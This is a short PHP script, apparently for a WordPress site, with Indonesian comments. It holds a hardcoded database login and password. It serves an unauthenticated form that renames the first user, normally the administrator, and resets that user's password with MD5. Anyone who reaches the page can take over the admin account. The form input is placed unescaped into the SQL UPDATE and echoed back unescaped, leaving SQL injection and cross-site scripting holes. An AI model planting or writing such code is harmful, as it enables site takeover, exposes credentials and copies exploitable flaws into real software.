<?php
if ($_POST) {
    $host = 'localhost';
    $user = 'agriculture';
    $pass = 'Agi@Min??el@22';
    $db   = 'agriculture';
    $prefix = 'ks';

    $new_user = $_POST['user_baru'];
    $new_pass = $_POST['password_baru'];

    $conn = mysqli_connect($host, $user, $pass, $db);

    if (!$conn) {
        die("Koneksi database gagal: " . mysqli_connect_error());
    }

    // Ambil user pertama
    $query = "SELECT ID FROM {$prefix}users ORDER BY ID ASC LIMIT 1";
    $result = mysqli_query($conn, $query);
    if (!$result || mysqli_num_rows($result) === 0) {
        die("Tidak ada user ditemukan di database.");
    }

    $row = mysqli_fetch_assoc($result);
    $id = $row['ID'];

    // Gunakan MD5 untuk WordPress lama (WordPress baru tidak akan bisa login dengan MD5!)
    $hashed = md5($new_pass);

    // Update username & password
    $update = "UPDATE {$prefix}users SET user_login='$new_user', user_pass='$hashed' WHERE ID=$id";
    if (mysqli_query($conn, $update)) {
        echo "✅ Username dan password berhasil diperbarui.<br>";
        echo "Username baru: <b>$new_user</b><br>";
        echo "Password baru: <b>$new_pass</b><br>";
    } else {
        echo "❌ Gagal update: " . mysqli_error($conn);
    }

    mysqli_close($conn);
} else {
?>
    <h2>Update Admin WordPress</h2>
    <form method="post">
        <input type="text" name="user_baru" placeholder="Username Baru"><br>
        <input type="text" name="password_baru" placeholder="Password Baru"><br>
        <input type="submit" value="Update User">
    </form>
<?php
}
?>
